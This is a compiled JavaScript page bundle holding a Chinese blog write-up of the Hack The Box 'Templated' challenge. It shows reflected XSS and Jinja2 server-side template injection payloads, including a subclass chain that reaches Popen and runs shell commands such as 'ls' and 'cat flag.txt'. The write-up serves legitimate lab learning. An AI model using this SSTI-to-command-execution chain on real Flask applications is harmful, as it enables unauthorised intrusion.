import{_ as c}from"./ValaxyMain.vue_vue_type_style_index_0_lang-DRVqeRiY.js";import{a as u,p as i,o as d,c as h,w as t,f as m,k as f,r as o,g as e,h as n}from"./app-CzjF7NIc.js";import"./YunFooter.vue_vue_type_script_setup_true_lang-17i98rOK.js";import"./YunCard.vue_vue_type_script_setup_true_lang-Da3dkqK-.js";import"./YunPageHeader.vue_vue_type_script_setup_true_lang-BsneHNVS.js";import"./index-C7yU5XnD.js";const b=e("h1",{id:"templated",tabindex:"-1"},[n("Templated "),e("a",{class:"header-anchor",href:"#templated","aria-label":'Permalink to "Templated"'},"​")],-1),g=e("p",null,"是ssti漏洞.",-1),y=e("p",null,"但是之前学习burpsuite下的题目的时候,没有学到这个.之前了解过概念.于是我专门回顾和学习了一下jinja2",-1),w=e("p",null,"尝试访问不存在的路径:",-1),k=e("pre",null,[e("code",null,`payload : /xyz

response : 发现会回显xyz在页面中
`)],-1),T=e("p",null,"既然会回显,那么尝试一下XSS来弹窗一下",-1),v=e("pre",null,[e("code",null,`payload : /<img src=1 onerror=alert(1)>

response : 按照预料,进行了弹窗
`)],-1),E=e("p",null,"但是此时,依旧没有flag.根据题目描述,应该是必须要用到模板.",-1),P=e("p",null,"确认是否存在模板的注入",-1),$=e("pre",null,[e("code",null,`payload :  /{{1+1}}

response : 会回显计算结果2
`)],-1),B=e("p",null,[n("接着,我又继续学习了针对jinja2的ssti相关的知识:"),e("a",{href:"https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti(%E6%8E%A8%E8%8D%90%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0,%E9%9D%9E%E5%B8%B8%E4%B8%8D%E9%94%99!)",target:"_blank",rel:"noreferrer"},"https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti(推荐这篇文章,非常不错!)")],-1),j=e("p",null,"确认Flask的模板引擎为jinja2",-1),I=e("pre",null,[e("code",null,`payload :  /{{config}}
`)],-1),A=e("p",null,'尝试使用ssti基础的注入方式,查看python环境下,""所属的类,及继承该类的全部类(其实这里结果是全部的类及子类):',-1),H=e("pre",null,[e("code",null,`payload : /{{"".__class__.__mro__[1].__subclasses__()}}

response : 返回python下mro[1]的全部类及其子类
`)],-1),M=e("blockquote",null,[e("p",null,"mro 在python官方的文档下的Sepcial Attributes中有定义")],-1),S=e("p",null,[n("此时我们查找Popen的python公共方法("),e("a",{href:"https://docs.python.org/zh-cn/3/library/subprocess.html",target:"_blank",rel:"noreferrer"},"https://docs.python.org/zh-cn/3/library/subprocess.html"),n(")")],-1),q=e("p",null,"对该处使用burpsuite的intruder进行遍历,计算popen位于__subclasses__的下标编号.发现是414(其实还有一种方法是利用python语的切片表达式来快速定位)",-1),z=e("p",null,"看文档关于Popen的使用,参数可以使用字符,也可以使用序列(例如列表).",-1),D=e("p",null,"看文档得知,调用的方式是实例化Popen类,并调用其下的communicate()方法.同时,要保证stdout为Popen.PIPE.而PIPE为一个特殊的数字,来代表这些标准输出标准输入etc.",-1),N=e("p",null,"其中communicate()方法是为了和子进程进行交互的",-1),R=e("p",null,[n("所以我们可以先使用"),e("code",null,"__globals__"),n(" 来获取更多信息.比如说查看一下PIPE的值到底是多少")],-1),V=e("blockquote",null,[e("p",null,[e("code",null,"__globals__"),n(" : 返回一个当前空间下能使用的模块，方法和变量的字典")])],-1),F=e("pre",null,[e("code",null,`payload : {{''.__class__.__mro__[1].__subclasses__()[414].__init__.__globals__}}

response : 浏览器中使用<c-f>,查看到PIPE的值为-1
`)],-1),C=e("p",null,"那么,我们现在可以实例化类并调用方法了",-1),L=e("p",null,"先看一下当前路径下的文件",-1),O=e("pre",null,[e("code",null,`payload :  /{{''.__class__.__mro__[1].__subclasses__()[414]('ls -lh',shell=True,stdout=-1).communicate()}}

response : 在response中查看到有flag.txt的文件
`)],-1),W=e("p",null,"然后使用cat命令,输出flag的内容",-1),Z=e("pre",null,[e("code",null,`response : /{{''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate()}}
`)],-1),x=e("p",null,[e("strong",null,"最后"),n(":")],-1),J=e("p",null,"这里使用的是Popen的方法进行任意命令执行的.也可以使用<class 'warnings.catch_warnings'>下的builtins 实现同样的目的",-1),U=e("h2",{id:"reference",tabindex:"-1"},[n("Reference: "),e("a",{class:"header-anchor",href:"#reference","aria-label":'Permalink to "Reference:"'},"​")],-1),X=e("ol",null,[e("li",null,[e("a",{href:"https://www.youtube.com/watch?v=tv0We4MM7ic",target:"_blank",rel:"noreferrer"},"https://www.youtube.com/watch?v=tv0We4MM7ic")]),e("li",null,[e("a",{href:"https://souvikinator.netlify.app/blog/htb-web-l2/",target:"_blank",rel:"noreferrer"},"https://souvikinator.netlify.app/blog/htb-web-l2/")])],-1),le={__name:"htb-templated-or-writeup",setup(G,{expose:_}){const l=JSON.parse('{"title":"[HTB] Templated | writeup","description":"","frontmatter":{"title":"[HTB] Templated | writeup","date":"2021-12-15T16:54:33.000Z","tags":["HTB","web","刷题","靶场"],"published":true,"hideInList":false,"feature":null,"isTop":false},"headers":[{"level":2,"title":"Reference:","slug":"reference","link":"#reference","children":[]}],"relativePath":"pages/posts/history/htb-templated-or-writeup.md","path":"/home/runner/work/1dayluo.github.io/1dayluo.github.io/pages/posts/history/htb-templated-or-writeup.md","lastUpdated":1714218709000}'),r=u(),a=l.frontmatter||{};return r.meta.frontmatter=Object.assign(r.meta.frontmatter||{},l.frontmatter||{}),i("pageData",l),i("valaxy:frontmatter",a),globalThis.$frontmatter=a,_({frontmatter:{title:"[HTB] Templated | writeup",date:"2021-12-15T16:54:33.000Z",tags:["HTB","web","刷题","靶场"],published:!0,hideInList:!1,feature:null,isTop:!1}}),(s,Q)=>{const p=c;return d(),h(p,{frontmatter:m(a)},{"main-content-md":t(()=>[b,g,y,w,k,f(" more "),T,v,E,P,$,B,j,I,A,H,M,S,q,z,D,N,R,V,F,C,L,O,W,Z,x,J,U,X]),"main-header":t(()=>[o(s.$slots,"main-header")]),"main-header-after":t(()=>[o(s.$slots,"main-header-after")]),"main-nav":t(()=>[o(s.$slots,"main-nav")]),"main-content":t(()=>[o(s.$slots,"main-content")]),"main-content-after":t(()=>[o(s.$slots,"main-content-after")]),"main-nav-before":t(()=>[o(s.$slots,"main-nav-before")]),"main-nav-after":t(()=>[o(s.$slots,"main-nav-after")]),comment:t(()=>[o(s.$slots,"comment")]),footer:t(()=>[o(s.$slots,"footer")]),aside:t(()=>[o(s.$slots,"aside")]),"aside-custom":t(()=>[o(s.$slots,"aside-custom")]),default:t(()=>[o(s.$slots,"default")]),_:3},8,["frontmatter"])}}};export{le as default};
